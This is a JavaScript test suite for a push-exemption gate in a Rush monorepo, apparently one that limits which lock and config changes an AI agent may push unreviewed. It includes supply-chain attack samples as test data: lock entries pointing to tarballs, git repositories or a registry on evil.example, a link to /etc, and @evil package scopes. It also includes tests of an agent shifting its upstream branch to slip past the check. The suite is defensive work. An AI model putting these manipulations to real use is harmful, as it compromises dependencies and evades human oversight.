// Tests for the push exemption: the pushExempt list of gate-files.json (lib/gate-list.mjs) and
// pushBlockers in lib/push-exempt.mjs. Each range is built for real in a temp git repo. The negative
// tests close the findings of the security review: F1 (rush.json removal, repoint, edit), F2 (lock
// with a tarball or git source, a changed integrity, a hash-only change of repo-state.json) and F6
// (the base is origin/main, not the upstream of the branch).
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';

import { findGate, pushExemptEntries, pushExemption } from '../lib/gate-list.mjs';
import { pushBlockers } from '../lib/push-exempt.mjs';

import { exec, makeRepository } from './harness.js';

const LOCK = 'common/config/rush/pnpm-lock.yaml';
const STATE = 'common/config/rush/repo-state.json';
const CONFIG = 'common/config/rush/pnpm-config.json';
const OTHER_LOCK = 'projects/x/pnpm-lock.yaml';
const GATE = 'scripts/gates/lib/fs-io.mjs';

const hash = (letter) => `sha512-${letter.repeat(86)}==`;
/**
 * Makes the text of a Rush lock that has the given packages.
 *
 * @param {[string, string][]} packages - Key and hash letter of each package.
 * @param {string} [header] - Extra header line.
 * @returns {string} The lock text.
 */
const lockText = (packages, header = '') => `lockfileVersion: '9.0'

settings:
  autoInstallPeers: false
${header}
importers:

  .: {}

  ../../projects/b:
    dependencies:
      zod:
        specifier: ^3.0.0
        version: 3.23.8

packages:

${packages.map(([key, letter]) => `  ${key}:\n    resolution: {integrity: ${hash(letter)}}\n`).join('\n')}
snapshots:

${packages.map(([key]) => `  ${key}: {}\n`).join('\n')}`;
const LOCK_OLD = lockText([['zod@3.23.8', 'A']]);
const LOCK_NEW = lockText([
  ['left-pad@1.3.0', 'B'],
  ['zod@3.23.8', 'A'],
]);
const STATE_OLD = `// generated\n{"pnpmShrinkwrapHash":"${'a'.repeat(40)}"}\n`;
const STATE_NEW = `// generated\n{"pnpmShrinkwrapHash":"${'b'.repeat(40)}"}\n`;

const ENTRY_A = '{ "packageName": "@t/a", "projectFolder": "packages/a" }';
const entryOf = (name) =>
  `{ "packageName": "@vprprudhvi/${name}", "projectFolder": "projects/${name}", "shouldPublish": false, "tags": ["project/${name}"] }`;
const rushJsonWith = (entries) => `{
  // Rush
  "rushVersion": "5.100.0",
  "projects": [
    ${entries.join(',\n    ')}
  ]
}
`;
const RUSH_JSON = rushJsonWith([ENTRY_A]);
const RUSH_JSON_PLUS_PROJECT = rushJsonWith([ENTRY_A, entryOf('bb')]);
const PROJECT_PACKAGE = 'projects/bb/package.json';
const PROJECT_PACKAGE_TEXT = '{"name":"@vprprudhvi/bb","version":"1.0.0"}\n';

const files = (changes) => changes.map((change) => change.file).sort();

describe('pushExempt list (gate-list)', () => {
  it('lists the two generated Rush files and rush.json, and nothing else', () => {
    assert.deepEqual(
      pushExemptEntries().map((entry) => [entry.path, entry.push]),
      [
        [LOCK, 'agent-if-lock-clean'],
        [STATE, 'agent-with-clean-lock'],
        ['rush.json', 'agent-if-projects-added'],
      ],
    );
  });

  it('finds an entry only for the exact path', () => {
    assert.equal(pushExemption(LOCK)?.push, 'agent-if-lock-clean');
    assert.equal(pushExemption(STATE)?.push, 'agent-with-clean-lock');
    assert.equal(pushExemption('rush.json')?.push, 'agent-if-projects-added');
    for (const other of [
      CONFIG,
      OTHER_LOCK,
      'common/config/rush/command-line.json',
      'common/config/rush/PNPM-LOCK.YAML',
      'Common/config/rush/pnpm-lock.yaml',
      'RUSH.JSON',
      `${LOCK}/x`,
      `./${LOCK}`,
      'uv.lock',
      'projects/x/src/api-py/uv.lock',
      'projects/x/src/api-go/go.sum',
      'projects/x/src/api-go/go.mod',
      'projects/x/src/api-py/pyproject.toml',
      GATE,
    ]) {
      assert.equal(pushExemption(other), null, other);
    }
  });

  it('keeps each exempt path a gate file, a literal path, with a known mode and a reason', () => {
    for (const entry of pushExemptEntries()) {
      assert.notEqual(findGate(entry.path), null, entry.path);
      assert.doesNotMatch(entry.path, /[*?[\]{}]/, entry.path);
      assert.ok(
        ['agent-if-lock-clean', 'agent-with-clean-lock', 'agent-if-projects-added'].includes(
          entry.push,
        ),
        entry.path,
      );
      assert.ok(entry.why.length > 0, entry.path);
    }
  });

  it('does not change the gate glob of any file: the broad rush glob still matches', () => {
    assert.equal(findGate(LOCK)?.glob, 'common/config/rush/**');
    assert.equal(findGate(STATE)?.glob, 'common/config/rush/**');
    assert.equal(findGate(CONFIG)?.glob, 'common/config/rush/**');
    assert.equal(findGate('rush.json')?.glob, 'rush.json');
    assert.equal(findGate(OTHER_LOCK)?.glob, '**/pnpm-lock.yaml');
  });
});

describe('pushBlockers', () => {
  let repository;

  beforeEach(() => {
    repository = makeRepository({
      [LOCK]: LOCK_OLD,
      [STATE]: STATE_OLD,
      [CONFIG]: '{"strictPeerDependencies":true}\n',
      [OTHER_LOCK]: 'lockfileVersion: 9\n',
      [GATE]: 'export const a = 1;\n',
      'rush.json': RUSH_JSON,
      'packages/b/package.json': '{"name":"@t/b","version":"1.0.0"}\n',
      'src/app.mjs': 'export const b = 2;\n',
    });
  });
  afterEach(() => repository.remove());

  const commit = (message) => {
    repository.git('add', '-A');
    repository.git('commit', '-q', '-m', message);
  };
  const blockers = () => pushBlockers(repository.root);
  const blockedFiles = () => files(blockers().blocking);

  describe('exempt ranges', () => {
    it('reports nothing for a range without a gate change', () => {
      repository.write('src/app.mjs', 'export const b = 3;\n');
      commit('plain');
      const found = blockers();
      assert.equal(found.base, 'the root commit');
      assert.deepEqual(found.blocking, []);
      assert.deepEqual(found.exempt, []);
    });

    it('does not block a range that changes pnpm-lock.yaml and repo-state.json (a new package)', () => {
      repository.write(LOCK, LOCK_NEW);
      repository.write(STATE, STATE_NEW);
      commit('rush add');
      const found = blockers();
      assert.deepEqual(found.blocking, []);
      assert.deepEqual(files(found.exempt), [LOCK, STATE]);
    });

    it('does not block a lock change alone (without repo-state.json)', () => {
      repository.write(LOCK, LOCK_NEW);
      commit('lock only');
      const found = blockers();
      assert.deepEqual(found.blocking, []);
      assert.deepEqual(files(found.exempt), [LOCK]);
    });

    it('does not block a repo-state.json that the range adds, with a lock change', () => {
      const other = makeRepository({ [LOCK]: LOCK_OLD });
      try {
        other.write(LOCK, LOCK_NEW);
        other.write(STATE, STATE_NEW);
        other.git('add', '-A');
        other.git('commit', '-q', '-m', 'first rush update');
        const found = pushBlockers(other.root);
        assert.deepEqual(found.blocking, []);
        assert.deepEqual(files(found.exempt), [LOCK, STATE]);
        assert.equal(found.exempt.find((entry) => entry.file === STATE)?.change, 'added');
      } finally {
        other.remove();
      }
    });

    it('does not block a version bump (new key, old key gone)', () => {
      repository.write(LOCK, lockText([['zod@3.24.0', 'B']]));
      repository.write(STATE, STATE_NEW);
      commit('bump');
      assert.deepEqual(blockers().blocking, []);
    });

    it('does not block rush.json when a project is added and its package.json exists', () => {
      repository.write('rush.json', RUSH_JSON_PLUS_PROJECT);
      repository.write(PROJECT_PACKAGE, PROJECT_PACKAGE_TEXT);
      commit('register a project');
      const found = blockers();
      assert.deepEqual(found.blocking, []);
      assert.deepEqual(files(found.exempt), ['rush.json']);
    });

    it('does not block rush.json with a registered project and the lock together', () => {
      repository.write('rush.json', RUSH_JSON_PLUS_PROJECT);
      repository.write(PROJECT_PACKAGE, PROJECT_PACKAGE_TEXT);
      repository.write(LOCK, LOCK_NEW);
      repository.write(STATE, STATE_NEW);
      commit('register a project and update the lock');
      const found = blockers();
      assert.deepEqual(found.blocking, []);
      assert.deepEqual(files(found.exempt), [LOCK, STATE, 'rush.json']);
    });
  });

  describe('mixed and unrelated ranges', () => {
    it('blocks a mixed range and keeps the exempt file out of the blocking list', () => {
      repository.write(LOCK, LOCK_NEW);
      repository.write(GATE, 'export const a = 2;\n');
      commit('lock and gate script');
      const found = blockers();
      assert.deepEqual(files(found.blocking), [GATE]);
      assert.deepEqual(files(found.exempt), [LOCK]);
    });

    it('blocks a mixed range when the gate change is in an earlier commit', () => {
      repository.write(GATE, 'export const a = 2;\n');
      commit('gate script');
      repository.write(LOCK, LOCK_NEW);
      commit('lock');
      assert.deepEqual(blockedFiles(), [GATE]);
    });

    it('blocks pnpm-config.json and the other files of common/config/rush', () => {
      repository.write(LOCK, LOCK_NEW);
      repository.write(CONFIG, '{"strictPeerDependencies":false}\n');
      repository.write('common/config/rush/command-line.json', '{}\n');
      commit('lock, config and a new command file');
      const found = blockers();
      assert.deepEqual(files(found.blocking), ['common/config/rush/command-line.json', CONFIG]);
      assert.deepEqual(files(found.exempt), [LOCK]);
    });

    it('does not exempt a pnpm-lock.yaml at another depth', () => {
      repository.write(OTHER_LOCK, 'lockfileVersion: 9\npackages: {}\n');
      commit('another lock');
      assert.deepEqual(blockedFiles(), [OTHER_LOCK]);
    });

    it('does not exempt the lock files of Python and Go', () => {
      repository.write('projects/x/src/api-py/uv.lock', 'x\n');
      repository.write('projects/x/src/api-go/go.sum', 'x\n');
      repository.write('projects/x/src/api-go/go.mod', 'module x\n');
      repository.write('projects/x/src/api-py/pyproject.toml', '[tool.ruff]\n');
      commit('python and go files');
      assert.deepEqual(blockedFiles(), [
        'projects/x/src/api-go/go.mod',
        'projects/x/src/api-go/go.sum',
        'projects/x/src/api-py/pyproject.toml',
        'projects/x/src/api-py/uv.lock',
      ]);
    });

    it('keeps a package.json phase script change blocking next to the exempt files', () => {
      repository.write(
        'packages/b/package.json',
        '{"name":"@t/b","version":"1.0.0","scripts":{"_phase:test":"true"}}\n',
      );
      repository.write(LOCK, LOCK_NEW);
      commit('phase script and lock');
      const found = blockers();
      assert.deepEqual(files(found.blocking), ['packages/b/package.json']);
      assert.equal(found.blocking[0]?.change, 'phase-script');
      assert.deepEqual(files(found.exempt), [LOCK]);
    });

    it('blocks a deleted pnpm-lock.yaml, repo-state.json and rush.json', () => {
      fs.rmSync(path.join(repository.root, LOCK));
      fs.rmSync(path.join(repository.root, STATE));
      fs.rmSync(path.join(repository.root, 'rush.json'));
      commit('delete the generated files');
      assert.deepEqual(blockedFiles(), [LOCK, STATE, 'rush.json']);
    });

    it('blocks a pnpm-lock.yaml that became a symbolic link', () => {
      fs.rmSync(path.join(repository.root, LOCK));
      fs.symlinkSync('repo-state.json', path.join(repository.root, LOCK));
      commit('lock is a link now');
      const found = blockers();
      assert.deepEqual(files(found.blocking), [LOCK]);
      assert.equal(found.blocking[0]?.change, 'type');
    });

    it('blocks a rush.json that became a symbolic link', () => {
      fs.rmSync(path.join(repository.root, 'rush.json'));
      fs.symlinkSync('packages/b/package.json', path.join(repository.root, 'rush.json'));
      commit('rush.json is a link now');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });
  });

  describe('the lock lint (F2)', () => {
    const lockCase = (name, text) =>
      it(`blocks the lock and repo-state.json when ${name}`, () => {
        repository.write(LOCK, text);
        repository.write(STATE, STATE_NEW);
        commit(name);
        const found = blockers();
        assert.deepEqual(files(found.blocking), [LOCK, STATE]);
        assert.deepEqual(found.exempt, []);
      });

    lockCase(
      'a package has a tarball resolution',
      LOCK_NEW.replace(`{integrity: ${hash('B')}}`, '{tarball: https://evil.example/left-pad.tgz}'),
    );
    lockCase(
      'a package has a tarball resolution next to an integrity hash',
      LOCK_NEW.replace(
        `{integrity: ${hash('B')}}`,
        `{integrity: ${hash('B')}, tarball: https://evil.example/left-pad.tgz}`,
      ),
    );
    lockCase(
      'a package comes from git',
      LOCK_NEW.replace(
        '  left-pad@1.3.0:\n    resolution: {integrity: ' + hash('B') + '}',
        "  'left-pad@git+https://evil.example/left-pad.git':\n    resolution: {commit: 0123456789abcdef0123456789abcdef01234567, repo: https://evil.example/left-pad.git, type: git}",
      ),
    );
    lockCase(
      'a package comes from a directory',
      LOCK_NEW.replace(`{integrity: ${hash('B')}}`, '{directory: ../../evil, type: directory}'),
    );
    lockCase(
      'the integrity of a package that was in the old lock changed',
      LOCK_NEW.replace(hash('A'), hash('C')),
    );
    lockCase(
      'a registry setting is added to the header',
      lockText(
        [
          ['left-pad@1.3.0', 'B'],
          ['zod@3.23.8', 'A'],
        ],
        '  registry: https://evil.example/\n',
      ),
    );
    lockCase(
      'a dependency is linked to a folder outside the repo',
      LOCK_NEW.replace('version: 3.23.8', 'version: link:../../../../etc'),
    );
    lockCase(
      'a specifier is a github source',
      LOCK_NEW.replace('specifier: ^3.0.0', 'specifier: github:evil/zod'),
    );

    it('blocks a hash-only change of repo-state.json (no lock change in the range)', () => {
      repository.write(STATE, STATE_NEW);
      commit('rewrite the lock hash');
      const found = blockers();
      assert.deepEqual(files(found.blocking), [STATE]);
      assert.deepEqual(found.exempt, []);
    });

    it('blocks a repo-state.json that the range adds when the lock is not changed', () => {
      const other = makeRepository({ [LOCK]: LOCK_OLD });
      try {
        other.write(STATE, STATE_NEW);
        other.git('add', '-A');
        other.git('commit', '-q', '-m', 'state only');
        assert.deepEqual(files(pushBlockers(other.root).blocking), [STATE]);
      } finally {
        other.remove();
      }
    });

    it('blocks a repo-state.json with another key or a value that is not a hash, next to a clean lock', () => {
      for (const text of [
        `{"pnpmShrinkwrapHash":"${'b'.repeat(40)}","extra":"x"}\n`,
        '{"pnpmShrinkwrapHash":"not a hash"}\n',
        '[]\n',
      ]) {
        repository.write(LOCK, LOCK_NEW);
        repository.write(STATE, text);
        commit('state');
        const found = blockers();
        assert.deepEqual(files(found.blocking), [STATE], text);
        assert.deepEqual(files(found.exempt), [LOCK], text);
        repository.git('reset', '-q', '--hard', 'HEAD~1');
      }
    });

    it('judges the lock by the net change of the range', () => {
      repository.write(LOCK, LOCK_NEW.replace(hash('B'), 'x'));
      commit('bad lock');
      repository.write(LOCK, LOCK_NEW);
      commit('fixed lock');
      assert.deepEqual(blockers().blocking, []);
      repository.write(LOCK, LOCK_NEW.replace(hash('A'), hash('C')));
      commit('swap a hash');
      assert.deepEqual(blockedFiles(), [LOCK]);
    });
  });

  describe('rush.json (F1)', () => {
    const rushCase = (name, entries, extra = () => {}) =>
      it(`blocks rush.json when ${name}`, () => {
        repository.write('rush.json', rushJsonWith(entries));
        extra();
        commit(name);
        assert.deepEqual(blockedFiles(), ['rush.json']);
      });
    const withPackage = () => repository.write(PROJECT_PACKAGE, PROJECT_PACKAGE_TEXT);

    rushCase('an entry is removed', [entryOf('bb')], withPackage);
    rushCase('every entry is removed', []);
    rushCase('an entry is removed and a project is added', [entryOf('bb')], withPackage);
    rushCase(
      'an old entry is repointed to another folder',
      [ENTRY_A.replace('packages/a', 'packages/elsewhere'), entryOf('bb')],
      withPackage,
    );
    rushCase(
      'an old entry gets another package name',
      [ENTRY_A.replace('@t/a', '@evil/a'), entryOf('bb')],
      withPackage,
    );
    rushCase(
      'an old entry is edited (a key is added)',
      [ENTRY_A.replace('}', ', "shouldPublish": true }'), entryOf('bb')],
      withPackage,
    );
    rushCase(
      'an added entry is not the register-project shape',
      [ENTRY_A, entryOf('bb').replace('"shouldPublish": false', '"shouldPublish": true')],
      withPackage,
    );
    rushCase(
      'an added entry has another scope',
      [ENTRY_A, entryOf('bb').replace('@vprprudhvi/', '@evil/')],
      withPackage,
    );
    rushCase('an added project has no package.json', [ENTRY_A, entryOf('bb')]);

    it('blocks rush.json when the package.json of an added project has another name', () => {
      repository.write('rush.json', RUSH_JSON_PLUS_PROJECT);
      repository.write(PROJECT_PACKAGE, '{"name":"@evil/bb","version":"1.0.0"}\n');
      commit('wrong package name');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });

    it('blocks rush.json when a key outside projects changed', () => {
      repository.write('rush.json', RUSH_JSON.replace('5.100.0', '5.101.0'));
      commit('bump rush');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });

    it('blocks rush.json when projects and another key changed in one commit', () => {
      repository.write('rush.json', RUSH_JSON_PLUS_PROJECT.replace('5.100.0', '5.101.0'));
      repository.write(PROJECT_PACKAGE, PROJECT_PACKAGE_TEXT);
      commit('register a project and bump rush');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });

    it('blocks rush.json when a comment outside projects changed', () => {
      repository.write('rush.json', RUSH_JSON.replace('// Rush', '// Rush config'));
      commit('comment');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });

    it('blocks rush.json when an extra top-level key is added', () => {
      repository.write(
        'rush.json',
        RUSH_JSON.replace('"projects"', '"experiment": true,\n  "projects"'),
      );
      commit('new key');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });

    it('judges rush.json by the net change of the range, not commit by commit', () => {
      repository.write('rush.json', RUSH_JSON.replace('5.100.0', '5.101.0'));
      commit('bump rush');
      repository.write('rush.json', RUSH_JSON_PLUS_PROJECT);
      repository.write(PROJECT_PACKAGE, PROJECT_PACKAGE_TEXT);
      commit('revert the bump and register a project');
      assert.deepEqual(blockers().blocking, []);
      repository.write('rush.json', RUSH_JSON_PLUS_PROJECT.replace('5.100.0', '5.102.0'));
      commit('bump rush again');
      assert.deepEqual(blockedFiles(), ['rush.json']);
    });

    it('shows nothing for rush.json when the range changes it and changes it back', () => {
      repository.write('rush.json', RUSH_JSON.replace('5.100.0', '5.101.0'));
      commit('bump rush');
      repository.write('rush.json', RUSH_JSON);
      commit('revert');
      const found = blockers();
      assert.deepEqual(found.blocking, []);
      assert.deepEqual(found.exempt, []);
    });
  });

  describe('the push base (F6)', () => {
    let remote;

    beforeEach(() => {
      remote = path.join(path.dirname(repository.root), `${path.basename(repository.root)}-pe.git`);
      assert.equal(exec('git', ['init', '-q', '--bare', remote]).status, 0);
      repository.git('remote', 'add', 'origin', remote);
      repository.git('push', '-q', 'origin', 'main');
      repository.git('checkout', '-q', '-b', 'feature');
    });
    afterEach(() => fs.rmSync(remote, { recursive: true, force: true }));

    it('starts at the merge base with origin/main', () => {
      repository.write(GATE, 'export const a = 2;\n');
      commit('gate');
      const found = blockers();
      assert.equal(found.base, 'origin/main');
      assert.deepEqual(files(found.blocking), [GATE]);
    });

    it('does not move to the upstream of the branch (git branch -u, git push -u)', () => {
      repository.write(GATE, 'export const a = 2;\n');
      commit('gate that the agent made');
      repository.git('push', '-q', '-u', 'origin', 'feature');
      repository.write('src/app.mjs', 'export const b = 6;\n');
      commit('plain');
      const found = blockers();
      assert.equal(found.base, 'origin/main');
      assert.deepEqual(files(found.blocking), [GATE]);
    });

    it('does not move to another upstream that the agent sets', () => {
      repository.write(GATE, 'export const a = 2;\n');
      commit('gate');
      repository.git('push', '-q', 'origin', 'feature:other');
      repository.git('branch', '-u', 'origin/other');
      assert.deepEqual(blockedFiles(), [GATE]);
    });

    it('checks the lock against the merge base, not the upstream', () => {
      repository.write(LOCK, LOCK_NEW.replace(hash('B'), 'x'));
      commit('bad lock');
      repository.git('push', '-q', '-u', 'origin', 'feature');
      repository.write(LOCK, LOCK_NEW);
      commit('good lock');
      assert.deepEqual(blockers().blocking, []);
      repository.write(LOCK, LOCK_NEW.replace(hash('A'), hash('C')));
      commit('swap a hash');
      assert.deepEqual(blockedFiles(), [LOCK]);
    });
  });
});
